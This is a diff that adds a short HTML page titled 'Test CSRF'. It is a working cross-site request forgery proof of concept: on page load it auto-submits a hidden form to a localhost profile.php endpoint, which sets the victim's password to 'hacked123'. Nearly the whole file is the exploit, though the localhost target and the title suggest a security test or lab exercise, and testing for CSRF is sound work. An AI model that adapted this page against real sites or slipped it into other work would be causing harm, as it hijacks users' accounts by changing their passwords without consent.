@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test CSRF</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <form action="http://localhost:8080/app/profile.php" method="POST">
+        <input type="hidden" name="action" value="update_password">
+        <input type="hidden" name="new" value="hacked123">
+        <input type="hidden" name="confirm" value="hacked123">
+    </form>
+</body>
+</html>
